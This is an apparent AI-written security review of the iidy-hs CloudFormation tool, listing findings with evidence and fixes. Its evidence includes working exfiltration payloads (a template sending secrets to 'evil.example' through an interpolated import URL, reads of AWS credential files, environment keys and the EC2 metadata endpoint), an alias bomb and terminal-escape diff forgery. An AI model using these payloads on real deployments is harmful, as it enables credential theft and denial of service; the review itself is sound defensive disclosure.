@@ -1,0 +1,699 @@
+#+title: C4 security review
+
+Reviewer model: Claude Fable 5.2 (=claude-fable-5-2=), run as an independent
+sub-agent on 2026-11-16 against HEAD =407337d= (GHC 9.12.3 build).
+
+* Summary
+:PROPERTIES:
+:ID: org:01a1e68e-1585-707c-91d5-94d136128670
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+Overall posture: the code is tidy, pure where it should be (the resolver and
+Handlebars engine do no IO), uses no shell for git, verifies TLS by default,
+and the March fixes are all still in place. The weak point is the import trust
+model. The gate itself (=parseImportType=) is wired in and blocks the direct
+cases, but it decides "remote or local" from a string prefix of the parent
+location and fails open, and the model as designed does not stop a remote
+template from reading secrets through the remote-allowed import types and
+sending them out through an interpolated import URL. The template approval
+feature is also weaker than its documentation suggests.
+
+Counts by severity: High 2, Medium 3, Low 7, Info 3. No Critical findings.
+
+Top risks:
+
+1. A remote template can escape the local-only restriction by importing an
+   S3 object with the short =s3:bucket/key= spelling; documents loaded that way
+   are treated as local and may use =file:=, =env:=, =git:=, =filehash:=.
+2. A remote template can read SSM SecureStrings, CloudFormation outputs, the
+   importing template's own variables and loopback/link-local HTTP endpoints,
+   and exfiltrate them in the URL of a nested =http(s):= import.
+3. =ApprovedTemplateLocation= is never consulted by create/update/changeset, so
+   the approval workflow does not gate deployments by itself.
+
+What I could not check:
+
+- No real AWS calls were made. Everything on the S3/SSM/CFN paths is confirmed
+  from code plus pure evaluation of the gate function, not end to end.
+- No network, so dependency advisories are from memory (knowledge cutoff
+  mid-2026) and not from a current advisory database query. No =cabal audit= /
+  =osv= run.
+- Terminal-escape effects were not demonstrated on a live terminal.
+- The PLT Redex spec, the test suite, benchmarks and CI config were not
+  reviewed. The Nix closure (system libraries such as OpenSSL/zlib/gmp) was
+  not audited.
+
+Scratch reproduction inputs live under
+=/tmp/claude-1000/-home-tavis-src-iidy-hs/f2c5724c-c18a-470a-95c4-5c03105ef675/scratchpad/c4/=
+(tmpfs, not durable): =server.py= (loopback HTTP server), =www/= (the "remote"
+documents), =local/= (the local parents).
+
+* Findings
+:PROPERTIES:
+:ID: org:01a1e68e-1585-707c-91d5-94d028df63ba
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+** High: import trust gate fails open for any parent location not spelled =s3://=, =http://= or =https://=
+:PROPERTIES:
+:ID: org:01a1e68e-1585-707c-91d5-94cf1de05539
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: High
+- Status :: CONFIRMED (gate behaviour evaluated; S3 fetch path read from code, not run against AWS)
+- Location :: =src/Iidy/Yaml/Imports/Types.hs:81=, =:122= (=isRemoteBase=);
+  =src/Iidy/Yaml/Imports/Loaders/S3.hs:38=, =:66=, =:127=;
+  =src/Iidy/Yaml/Engine.hs:199= (child base = =idLocation=)
+- Failure scenario :: A local stack-args or =render:= template imports
+  =https://partner.example/base.yaml= (attacker-controlled or MITM'd). That
+  document is correctly treated as remote. It then declares
+  =$imports: {b: "s3:attacker-bucket/b.yaml"}=. =s3:= is allowed from remote
+  templates, and the S3 loader accepts the short form (it strips =s3:= and an
+  optional =//=). The loaded document's base location is recorded verbatim as
+  =s3:attacker-bucket/b.yaml=, which does not start with =s3://=, so
+  =isRemoteBase= says "local". =b.yaml= may now use
+  =file:/home/user/.aws/credentials=, =env:AWS_SECRET_ACCESS_KEY=, =git:=,
+  =filehash:=, and can ship the values out through a further
+  =https://evil/{{urlEncode x}}= import (see next finding). The same
+  fail-open applies to documents loaded via =ssm:...:yaml= and =cfn:= (their
+  base locations are =ssm:...= / =cfn:...=), although those need content
+  planted in the victim's account. Requires an AWS env, so it applies to the
+  deploy commands (stack-args and =render:= templates), not to bare
+  =iidy render= (which passes no AWS env).
+- Evidence ::
+  #+begin_src haskell
+  -- Types.hs
+  isRemoteBase loc =
+      T.isPrefixOf "s3://" loc || T.isPrefixOf "http://" loc || T.isPrefixOf "https://" loc
+  -- S3.hs
+  let uri = fromMaybe location (T.stripPrefix "s3:" location)   -- :38
+  let withoutSlashes = fromMaybe uri (T.stripPrefix "//" uri)    -- :127, "bucket/key" accepted
+  , idLocation = location                                        -- :66, becomes the child's base
+  #+end_src
+  Gate evaluated with =ghc -e= on =Iidy.Yaml.Imports.Types=:
+  #+begin_example
+  parseImportType "file:/etc/passwd" "s3://bucket/evil.yaml"        => Left "Import type file is not allowed from remote templates"
+  parseImportType "s3:bucket/evil.yaml" "https://example.com/a.yaml" => Right ImportS3
+  parseImportType "file:/etc/passwd" "s3:bucket/evil.yaml"          => Right ImportFile
+  parseImportType "env:AWS_SECRET_ACCESS_KEY" "s3:bucket/evil.yaml" => Right ImportEnv
+  parseImportType "env:HOME" "ssm:/some/param:yaml"                 => Right ImportEnv
+  #+end_example
+- Recommendation :: Stop deriving trust from a string prefix. Carry an explicit
+  trust flag (or the parent's =ImportType=) through =processImportedDoc=: a
+  document is local only if it was loaded by =ImportFile= from a local parent;
+  everything else (S3, HTTP, SSM, CFN) is remote, and "remote" is sticky down
+  the import chain. Independently, normalise S3 locations to =s3://bucket/key=
+  (or reject the short form) and make =isRemoteBase= an allowlist of local
+  forms instead of a denylist of remote ones. Add regression tests for
+  =s3:bucket/key=, =ssm:=, =cfn:= parents.
+
+** High: remote templates can read secrets and exfiltrate them through interpolated import URLs
+:PROPERTIES:
+:ID: org:01a1e68e-1585-707c-91d5-94ce6b11308a
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: High
+- Status :: CONFIRMED for parent-variable leak and loopback fetch (reproduced);
+  CONFIRMED from code for =ssm:= / =cfn:= sources (no AWS run)
+- Location :: =src/Iidy/Yaml/Engine.hs:170= (location interpolation),
+  =:199= and =:233= (imported document inherits the parent's =env=);
+  =src/Iidy/Yaml/Imports/Loaders/Dispatch.hs:70-77= (=http=, =ssm=, =ssm-path=,
+  =cfn=, =s3= allowed from remote); =src/Iidy/Yaml/Imports/Loaders/Ssm.hs=
+  (=withDecryption = True=); =SECURITY.md= "What This Protects Against"
+- Failure scenario :: SECURITY.md says remote templates cannot steal
+  credentials or reach local resources. In practice a remote document has
+  three sources of sensitive data and one outbound channel:
+  1. /Parent variables./ The imported document is preprocessed with the
+     importing template's full environment (all =$defs= and every import
+     loaded before it). If the local template did =$imports: {dbPass:
+     "ssm:/prod/db/password", shared: "https://partner.example/shared.yaml"}=,
+     =shared.yaml= can reference =dbPass=.
+  2. /AWS data./ The remote document may itself import
+     =ssm:/any/parameter= (decrypted SecureStrings), =ssm-path:/= (the whole
+     parameter tree the caller can read), and =cfn:stack:...= with the
+     deployer's credentials.
+  3. /Internal HTTP./ It may import =http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>=
+     (IMDSv1 on EC2/CI runners), =http://localhost:...= admin endpoints, etc.
+     Redirects are followed, so an allowed-looking URL can also bounce there.
+  The channel: import locations are Handlebars-interpolated, so
+  =$imports: {x: "https://evil.example/{{urlEncode dbPass}}.yaml"}= sends the
+  value to the attacker. Nothing is printed locally; the import record is not
+  shown.
+- Evidence :: Reproduced with a loopback server standing in for the remote host.
+  #+begin_src yaml
+  # local/parent.yaml
+  $defs:
+    secret: hunter2
+  $imports:
+    r: "http://127.0.0.1:18473/evil.yaml"
+  out: !$ r
+  # www/evil.yaml (served remotely)
+  $imports:
+    x: "http://127.0.0.1:18473/leak/{{secret}}.yaml"
+  got: !$ secret
+  #+end_src
+  #+begin_example
+  $ iidy-hs render local/parent.yaml
+  out:
+    got: hunter2
+  server log:
+  REQ /evil.yaml
+  REQ /leak/hunter2.yaml
+  #+end_example
+  The same run shows a remote document fetching a loopback URL. Direct
+  =file:= / =env:= / bare relative imports from =evil-*.yaml= were correctly
+  rejected ("Import type file is not allowed from remote templates"), and an
+  HTTP redirect to =file:///etc/hostname= was refused (surfaced as "HTTP error
+  302").
+- Recommendation :: Decide what the trust model is meant to guarantee and
+  enforce it at the data-flow level:
+  - Do not pass the parent's environment into remote documents (or pass only
+    an explicit allowlist); resolve them in an empty environment.
+  - For remote documents, either forbid =ssm:=, =ssm-path:=, =cfn:= outright
+    (opt-in flag), or forbid Handlebars interpolation in import locations of
+    remote documents so that fetched values cannot reach a URL.
+  - Block loopback, link-local (=169.254.0.0/16=, =fd00:ec2::254=) and
+    private-range targets for =http(s):= imports requested by remote
+    documents, re-checking after each redirect (or disable redirects and
+    follow them manually).
+  - Update SECURITY.md: today it lists =ssm:= / =cfn:= under "What This
+    Allows" without stating the exfiltration consequence.
+
+** Medium: =ApprovedTemplateLocation= is not enforced by create/update/changeset
+:PROPERTIES:
+:ID: org:01a1e68e-1585-707c-91d5-94cde3b60847
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: Medium
+- Status :: CONFIRMED (code)
+- Location :: =src/Iidy/Cfn/RequestBuilder.hs:69=, =:110=, =:159= (template
+  loaded from =saTemplate= only); =saApprovedTemplateLocation= is referenced
+  only in =src/Iidy/Cfn/Operations/TemplateApproval.hs:68= and
+  =src/Iidy/Cfn/GlobalConfig.hs:107=; no-diff path at
+  =src/Iidy/Cfn/Operations/TemplateApproval.hs:226=
+- Failure scenario :: A team sets =ApprovedTemplateLocation: s3://approved/…=
+  in stack-args and relies on the README statement that templates need
+  approval before deployment. A developer edits the template and runs
+  =iidy-hs update-stack stack-args.yaml=. The tool sends the local, unapproved
+  template body straight to CloudFormation. In iidy-js the deploy commands
+  swap the template for the hashed S3 object under the approved location, so
+  an unapproved template fails to deploy; here (and in the Rust port, which
+  has the same gap) approval is advisory unless an IAM policy separately
+  restricts =cloudformation:TemplateUrl=. If such a policy exists the effect
+  flips: every deploy fails because a =TemplateBody= is sent.
+  Related: in =template-approval review=, when the pending template equals
+  =latest= the tool reports =approved: true= with the approved location but
+  never writes the approved object (=arCleanupCompleted = False=), so the
+  status output is wrong.
+- Evidence :: =grep -rn saApprovedTemplateLocation src= returns only the
+  loader, the type, GlobalConfig and the approval-request command.
+  =buildCreateStackInput= / update / changeset call
+  =loadCfnTemplate (saTemplate args) …= and never look at the approved
+  location.
+- Recommendation :: In the request builders, when =ApprovedTemplateLocation=
+  is set, compute the versioned key (=generateVersionedLocation=), require the
+  object to exist, and pass it as =TemplateURL=; fail with a pointer to
+  =template-approval request= otherwise. Fix the no-diff review path to copy
+  the pending object to the approved key (or report "not approved"). Record
+  the divergence from iidy-js in DIVERGENCES.md until fixed.
+
+** Medium: stack-args imports can run under different credentials/region than the deployment
+:PROPERTIES:
+:ID: org:01a1e68e-1585-707c-91d5-94cc843d0bd6
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: Medium
+- Status :: CONFIRMED (code); not run against AWS
+- Location :: =src/Iidy/Cfn/Runner.hs:64-70= (bootstrap env, all exceptions
+  swallowed); =src/Iidy/Cfn/StackArgsLoader.hs:197-207= (=resolveRawField=);
+  final env at =Runner.hs:77=
+- Failure scenario :: The AWS env used for =ssm:= / =cfn:= / =s3:= imports
+  while preprocessing stack-args is built from =Profile= / =Region= /
+  =AssumeRoleARN= read from the raw AST /before/ preprocessing. The env used
+  for the deployment is built from the /preprocessed/ values. When a field is
+  computed (=Profile: !$ profiles.prod=, =AssumeRoleARN: !$ roleArn=, an
+  env-map whose values are tags), the raw extraction yields =Nothing= and the
+  bootstrap silently falls back to ambient credentials (=AWS_PROFILE=, env
+  keys, default profile). Imports then read SSM parameters and stack outputs
+  from account A (say, a developer sandbox) and feed them as parameters into
+  a stack deployed to account B (production), with no warning. A templated
+  string (=Region: "{{r}}"=) is taken literally as the region name. If
+  bootstrap env creation fails for any reason the error is discarded.
+- Evidence ::
+  #+begin_src haskell
+  -- StackArgsLoader.hs
+  Just (AstPlainString t _) -> Just t
+  Just (AstTemplatedString t _) -> Just t      -- uninterpolated "{{...}}" used as-is
+  Just (AstMapping envMap _) -> lookupAstTextField environment envMap
+  Just _ -> Nothing                            -- tags: silently ignored
+  -- Runner.hs
+  bootstrapEnv <- ( ... Just . fst <$> createAwsEnvFromSettings merged )
+                    `catch` (\(_ :: SomeException) -> pure Nothing)
+  #+end_src
+- Recommendation :: After preprocessing, compare the merged settings with the
+  bootstrap settings; if they differ and any AWS import was performed, fail
+  (or re-run preprocessing with the final env). Reject non-literal
+  =Profile= / =Region= / =AssumeRoleARN= that cannot be resolved before
+  imports, instead of falling back to ambient credentials. Surface bootstrap
+  failures when an AWS import is requested.
+
+** Medium: untrusted text is written to the terminal without control-character filtering (approval diff can be forged)
+:PROPERTIES:
+:ID: org:01a1e68e-1585-707c-91d5-94cb5096de43
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: Medium
+- Status :: CONFIRMED that no filtering exists (code); terminal effect PLAUSIBLE (not demonstrated)
+- Location :: =src/Iidy/Output/Renderers/Interactive/Sections.hs:728=
+  (=rPutStr r (tdDiffOutput diff)=); =src/Iidy/Cfn/Operations/TemplateApproval.hs:500-503=
+  (=formatOp=); no sanitising helper anywhere under =src/Iidy/Output/=
+- Failure scenario :: The approval reviewer runs =template-approval review
+  s3://…/<hash>.yaml.pending= and decides from the diff printed to the
+  terminal. The pending object is written by the requester (the party the
+  approval is meant to check). A pending template containing =ESC[1A ESC[2K=
+  (cursor up, erase line), =\r=, or alternate-screen sequences inside a
+  comment can erase or overwrite the =+= lines that add, say, an IAM policy,
+  so the reviewer sees a harmless diff and types =y=. The approved bytes are
+  the real ones. The same raw-print applies to AWS-supplied strings (stack
+  event reasons, output values, tag values, parameter values) and to
+  =show=-formatted exception text.
+- Evidence :: =generateDiff= splits on lines and prefixes ="+ "= / ="- "=; the
+  renderer prints the result verbatim. =grep -rni "sanitiz\|isControl"= over
+  =src/= finds only =quoteYamlString= in ConvertStack (file output, not
+  terminal output).
+- Recommendation :: Add one output-layer function that replaces C0/C1 control
+  characters other than =\n= and =\t= (and bare =\r=) with a visible escape
+  (=\x1b=), and route the diff and every AWS- or template-sourced string
+  through it. For the approval diff specifically, also print the SHA-256 of
+  the pending content and check it against the key name before prompting.
+
+** Low: AWS session token is printed in transport-error messages
+:PROPERTIES:
+:ID: org:01a1e68e-1585-707c-91d5-94cadad6bb43
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: Low
+- Status :: CONFIRMED (reproduced, no AWS traffic)
+- Location :: =src/Iidy/Yaml/Imports/Loaders/Ssm.hs:60=, =:93=;
+  =src/Iidy/Yaml/Imports/Loaders/S3.hs= (=mkError (T.pack (show e))=);
+  =src/Iidy/Yaml/Imports/Loaders/Cfn.hs= (same pattern);
+  =src/Iidy/Cfn/Operations/TemplateApproval.hs= S3 helpers;
+  =src/Iidy/Aws/Sts.hs:34=; =src/Iidy/GetImport.hs= =tryBuildEnv=
+- Failure scenario :: Any connection failure, timeout or TLS error during an
+  AWS call made through these paths formats the =Amazonka.Error= with =show=.
+  For a =TransportError= that includes the full signed request.
+  =Authorization= is redacted by http-client, but =X-Amz-Security-Token= is
+  not, so temporary-credential session tokens land in CI logs and terminals
+  whenever the network hiccups.
+- Evidence ::
+  #+begin_example
+  $ env -i HOME=… AWS_ACCESS_KEY_ID=AKIAFAKE… AWS_SECRET_ACCESS_KEY=… \
+      AWS_SESSION_TOKEN=SESSIONTOKEN-SHOULD-NOT-PRINT AWS_REGION=us-east-1 \
+      https_proxy=http://127.0.0.1:9 iidy-hs get-import ssm:/foo/bar
+  Import error: SSM fetch error for /foo/bar: TransportError (HttpExceptionRequest Request {
+    host                 = "ssm.us-east-1.amazonaws.com"
+    …
+    requestHeaders       = [("X-Amz-Security-Token","SESSIONTOKEN-SHOULD-NOT-PRINT"),…,("Authorization","<REDACTED>")]
+  #+end_example
+- Recommendation :: Never =show= an =Amazonka.Error= for user output. Add one
+  formatter (=GlobalConfig.formatAwsError= is a start) that prints
+  code/message for =ServiceError=, and for =TransportError= prints only the
+  host and the inner exception content. Alternatively build the http-client
+  manager with =X-Amz-Security-Token= added to the redacted header set.
+
+** Low: no resource limits on YAML aliases, import chains or helper output
+:PROPERTIES:
+:ID: org:01a1e68e-1585-707c-91d5-94c92f017ed0
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: Low (denial of service of a CLI run; relevant because remote documents are untrusted)
+- Status :: CONFIRMED (alias expansion and chain depth reproduced); body-time limit PLAUSIBLE
+- Location :: =src/Iidy/Yaml/Parser.hs:73-74= (aliases returned as shared
+  nodes, no count/depth cap); =src/Iidy/Yaml/Imports/Manifest.hs:46-58=
+  (cycle check only, no depth or total-import cap);
+  =src/Iidy/Yaml/Handlebars/Helpers.hs:174= (=pad=, unbounded =T.replicate=);
+  =src/Iidy/Yaml/Imports/Loaders/Http.hs:108= (response timeout covers
+  headers, not total transfer time)
+- Failure scenario :: (a) A remote import of a few hundred bytes with nested
+  aliases expands exponentially when resolved and emitted; the 10 MB response
+  cap does not help. (b) A remote server answers every =/chain/N.yaml= with a
+  document importing =/chain/N+1.yaml=; the cycle detector never fires and
+  the run continues until killed, holding the deploy. (c) ={{pad x
+  2000000000}}= allocates gigabytes. (d) A server that sends headers promptly
+  and then drips the body can hold the connection far beyond 30 s.
+- Evidence ::
+  #+begin_example
+  bomb.yaml: 6 lines, ~380 bytes, 5 alias levels of fan-out 10
+  $ iidy-hs render local/bomb.yaml | wc -c      => 19753104
+  max RSS 253 MB, 1.45 s; each further level multiplies both by 10
+  $ timeout 10 iidy-hs render local/p-chain.yaml
+  killed by timeout; server log last line: REQ /chain/4170.yaml
+  #+end_example
+- Recommendation :: Cap import depth and total import count (small fixed
+  numbers), cap alias expansions or total resolved node count, cap =pad=
+  width, and wrap each HTTP import in an overall =System.Timeout.timeout=.
+
+** Low: =demo= uses a fixed, predictable directory under the shared temp dir and deletes it recursively
+:PROPERTIES:
+:ID: org:01a1e68e-1585-707c-91d5-94c826e5c3c5
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: Low
+- Status :: CONFIRMED (code)
+- Location :: =src/Iidy/Demo.hs:100-106=, =:156-165=
+- Failure scenario :: On a multi-user host another user pre-creates
+  =/tmp/iidy-demo= (or a symlink there to a directory they choose). The demo
+  writes its script files into it via =createDirectoryIfMissing= +
+  =writeFile=, then runs =bash -c= commands with that directory as cwd and the
+  victim's full environment. The other user owns the directory, so they can
+  replace =stack-args.yaml= or a template between the write and the =iidy=
+  invocation and have their template deployed with the victim's AWS
+  credentials. Two concurrent demo runs also trample each other, and the
+  first to finish removes the directory under the second.
+- Evidence :: =let demoDir = tmpDir </> "iidy-demo"= followed by
+  =bracket (createDirectoryIfMissing True demoDir >> pure demoDir)
+  removeDirectoryRecursive …=.
+- Recommendation :: Use a fresh private directory (=mkdtemp= semantics, mode
+  0700; e.g. =System.IO.Temp.withSystemTempDirectory=, or
+  =System.Posix.Temp.mkdtemp= since =unix= is already a dependency of the
+  executable).
+
+** Low: write operations query =pool.ntp.org= over unauthenticated SNTP
+:PROPERTIES:
+:ID: org:01a1e68e-1585-707c-91d5-94c76dd1eb22
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: Low
+- Status :: CONFIRMED (code)
+- Location :: =src/Iidy/Aws/Timing.hs:83-118=, =:161-164=
+- Failure scenario :: Every create/update/delete/changeset run sends a UDP
+  packet to =pool.ntp.org= and trusts the answer for the operation start
+  time. =--no-remote-imports= (documented for "air-gapped or
+  egress-restricted environments") does not disable it. An on-path attacker
+  or a hostile pool member can return a far-future timestamp so that event
+  filtering by start time hides the stack's failure events from the operator,
+  or a past timestamp so stale events from an earlier operation are shown as
+  current. No credential exposure.
+- Evidence :: =queryNtp= resolves =pool.ntp.org:123=, sends a bare SNTP
+  request and uses the transmit timestamp with no sanity bound against the
+  system clock.
+- Recommendation :: Bound the accepted offset from the system clock (reject
+  answers more than a few minutes away), add a flag/env to disable it, and
+  skip it under =--no-remote-imports=. Document the egress in SECURITY.md.
+
+** Low: =convert-stack-to-iidy= overwrites local files and SSM parameters without confirmation
+:PROPERTIES:
+:ID: org:01a1e68e-1585-707c-91d5-94c6e0b7579f
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: Low
+- Status :: CONFIRMED (code)
+- Location :: =src/Iidy/Cfn/Operations/ConvertStack.hs:574-631= (file
+  writes), =:677-703= (=PutParameter= with =overwrite = Just True=)
+- Failure scenario :: Running the command in a directory that already holds a
+  hand-edited =stack-args.yaml= / =cfn-template.yaml= / =stack-policy.json=
+  replaces them silently (=render= and =init-stack-args= both refuse without
+  =--overwrite= / =--force=). With =--move-params-to-ssm=, existing
+  parameters at =/<environment tag>/<project>/<ParamKey>= are overwritten,
+  where the environment segment comes from a tag on the stack being
+  converted. Files are created with the default umask, and the original
+  template plus parameter values are written in clear text.
+- Recommendation :: Refuse to overwrite existing files and existing SSM
+  parameters unless an explicit flag is passed; list what will be written
+  first.
+
+** Low: displayed credential source is a guess and can disagree with the credentials in use
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a94e929ee31f
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: Low
+- Status :: CONFIRMED (code)
+- Location :: =src/Iidy/Aws/Config.hs:44-71= versus =:128-164=
+- Failure scenario :: With =--profile prod= (or =Profile:= in stack-args) and
+  =AWS_ACCESS_KEY_ID= / =AWS_SECRET_ACCESS_KEY= also exported, the env is
+  built with =fromFilePath profile …= (profile wins), but
+  =detectCredentialSources= lists environment variables first, so the command
+  metadata says "environment variables (AWS_ACCESS_KEY_ID) (overriding
+  profile 'prod' …)". The operator is told the opposite of what happened.
+  The STS principal ARN printed next to it is accurate, which limits the
+  impact, but =getCallerIdentity= degrades to "unknown" on error.
+- Recommendation :: Derive the display from the provider that actually
+  produced the credentials (amazonka exposes the chosen provider path), or
+  apply the same precedence as =createAwsEnv=. Consider failing write
+  operations when the caller identity cannot be determined.
+
+** Low: plaintext =http:= imports and silent redirect following
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a94d23b74a2f
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: Low
+- Status :: CONFIRMED (code); redirect-to-file refusal reproduced
+- Location :: =src/Iidy/Yaml/Imports/Types.hs:75-76=;
+  =src/Iidy/Yaml/Imports/Loaders/Http.hs:56=, =:104-114=
+- Failure scenario :: =http://= import locations are accepted, so template
+  content can be altered in transit, which then feeds the two High findings.
+  Redirects (http-client default, up to ten) are followed, including
+  https-to-http downgrades and redirects to loopback/link-local hosts; the
+  recorded location and the import manifest keep the original URL, so the
+  audit trail does not show where content came from. The manifest with
+  SHA-256 digests is computed but never displayed or checked.
+- Recommendation :: Require =https:= unless a flag allows =http:=; set
+  =redirectCount = 0= or re-validate each hop; record the final URL; consider
+  optional digest pinning (=https://…#sha256=…=) using the digest already
+  computed for the manifest.
+
+** Info: SECURITY.md and CLI surface claim behaviour the code does not have
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a94c0e6cc79e
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: Info
+- Status :: CONFIRMED
+- Location :: =SECURITY.md= / =docs/SECURITY.md= "Relative Import Behavior";
+  =src/Iidy/Yaml/Imports/Types.hs:77= and =:95-97=;
+  =src/Iidy/Cfn/StackArgsLoader.hs:462=; =src/Iidy/Cli/Parser.hs:130=
+- Details :: (a) The doc says a bare relative import inside a remote template
+  resolves against the remote base (=database.yaml= ->
+  =s3://bucket/configs/database.yaml=). The code classifies it as =file:= and
+  rejects it ("Import type  is not allowed from remote templates", with an
+  empty type name). Safe, but the documented behaviour does not exist.
+  (b) =CommandsBefore= is parsed and validated but never executed; a user who
+  relies on a pre-deploy check there gets no warning. (c) =--debug= is parsed
+  and unused, so there is no debug logging and no debug leak. (d) SECURITY.md
+  does not mention =random:= being non-cryptographic (=System.Random=); do
+  not use =random:= imports for secrets.
+- Recommendation :: Correct the documents or implement the behaviour; warn
+  when =CommandsBefore= is present.
+
+** Info: =/iidy/disable-template-approval= in SSM switches approval off for everyone
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a94bd31f2511
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: Info
+- Status :: CONFIRMED (by design, inherited from upstream iidy)
+- Location :: =src/Iidy/Cfn/GlobalConfig.hs:103-116=
+- Details :: Anyone with =ssm:PutParameter= on =/iidy/*= in the target
+  account/region controls whether =ApprovedTemplateLocation= is honoured and
+  can append a notification ARN to every stack operation. It fails closed on
+  SSM errors. Worth stating in SECURITY.md and protecting with IAM.
+
+** Info: regex and git details
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a94a67a7d758
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+- Severity :: Info
+- Status :: CONFIRMED (code)
+- Location :: =src/Iidy/Yaml/CustomResources/JsonSchema.hs:175=,
+  =src/Iidy/Yaml/CustomResources/Params.hs:124=;
+  =src/Iidy/Yaml/Imports/Loaders/Git.hs:44-63=
+- Details :: =(=~)= from regex-tdfa throws on an invalid pattern, so a
+  malformed =pattern= in a template aborts the run through the generic
+  exception handler rather than the structured error path (length cap is in
+  place). =git= is found through =PATH= and run in the current directory with
+  fixed arguments and no shell; running iidy inside an untrusted checkout
+  lets that repo's git config (for example =core.fsmonitor=) execute code
+  during =git describe --dirty=, which is inherent to invoking git there.
+- Recommendation :: Use =makeRegexM= and report a normal error; no change
+  needed for git beyond a note.
+
+* Coverage notes
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a949908338cf
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+** 1. Import trust boundary
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a9481688fe51
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+Read =Imports/Types.hs=, all loaders, =Dispatch.hs=, =Engine.hs=,
+=Manifest.hs=, =ContentParsing.hs=, =TemplateLoader.hs=, =Render.hs=,
+=GetImport.hs=, =StackArgsLoader.hs=. Ran a loopback server with hostile
+documents. Clean: direct =file:= / =env:= / =git:= / =filehash:= and bare
+relative or =./= / =../= / =/= paths from an =http://= parent are rejected;
+unknown prefixes and upper-case schemes are rejected; redirect to =file://=
+is refused by http-client; the resolver (=!$=, =!$include=, =!$parseYaml=,
+=!$parseJson=, =$defs=) is pure and cannot reach files or env; TLS uses the
+default verifying manager; a 10 MB streaming cap exists for HTTP and S3.
+Not clean: fail-open base classification (High), exfiltration through
+remote-allowed types and inherited environment (High), no depth/alias limits
+and header-only timeout (Low), plaintext http and redirects (Low). Top-level
+templates are always local files (=render= and =render:= read from disk), so
+"remote" only arises through imports. Local file imports follow symlinks and
+=..= freely, which is consistent with local templates being trusted.
+
+** 2. Secret handling
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a947c884e6e1
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+SSM values are fetched with decryption and flow into the rendered
+output/parameters by design. No temp files are written for secrets; =--debug=
+is inert; amazonka logging is not enabled. Leak found: session token in
+=show=-formatted transport errors (Low). Preprocess errors for stack-args are
+printed with =show=, which includes import locations and paths but, from what
+I read, not imported values. =param get= prints values only on request and
+=--decrypt= is opt-in; =param set= defaults to SecureString. Secrets passed
+on the command line (=param set <value>=) are visible in the process list,
+as with any CLI.
+
+** 3. AWS credentials, profile, region, assume-role, approval
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a9469cf65458
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+Read =Aws/Config.hs=, =CredentialSource.hs=, =Sts.hs=, =Timing.hs=,
+=Cfn/Runner.hs=, =Context.hs=, =GlobalConfig.hs=, =CommandMetadata.hs=,
+=TemplateApproval.hs=, =TemplateHash.hs=, =Confirm.hs=. Clean: no silent
+default region (errors when none is configured); CLI overrides stack-args
+with explicit =no-profile= / =no-role= sentinels; profile is passed
+programmatically, not via =setEnv=; the approval review uploads the bytes it
+showed (no copy-after-review race); confirmation defaults to "no" and EOF
+fails closed. Not clean: bootstrap-versus-final env mismatch (Medium),
+approval not enforced on deploy and wrong status on the no-diff path
+(Medium), forged diff via control characters (Medium), misleading credential
+source display (Low), NTP (Low). No presigned URLs are generated anywhere.
+The approved key is content-addressed (SHA-256 of the rendered template),
+but nothing re-checks that an object's content matches its key.
+
+** 4. Subprocess and shell use
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a945340240ca
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+Only two sites. =git= import: fixed argv, no shell, allowlist of three
+subcommands, =PATH= lookup. =demo=: runs script-supplied commands through
+=/usr/bin/env bash -c= by design; a demo script is code. Its temp directory
+handling is the Low finding. No editor or pager is spawned.
+
+** 5. YAML parsing hazards
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a944ae51a596
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+HsYAML with a custom loader; unknown tags do not instantiate anything, and
+=!$parseYaml= / =!$parseJson= go through the same data-only parser
+(=astToValueRaw=), so there is no string-to-code path. Aliases are shared
+nodes with no expansion limit (Low, reproduced). Huge exponents
+(=1e1000000000=) rendered without blow-up. JMESPath (=--query=) is a local
+pure evaluator over the rendered document with a CLI-supplied query; not a
+remote input. Handlebars helpers are pure string functions; =pad= is
+unbounded. Regex validation uses regex-tdfa (no backtracking) with a length
+cap.
+
+** 6. File writes
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a943abb3f993
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+=render --outfile= refuses to overwrite without =--overwrite= (check then
+write, small race, low value). =init-stack-args= refuses without =--force=.
+=convert-stack-to-iidy= overwrites without asking and also overwrites SSM
+parameters (Low). =demo= writes under a predictable shared path (Low); its
+script file paths are checked for absolute paths and =..=. All files use the
+default umask.
+
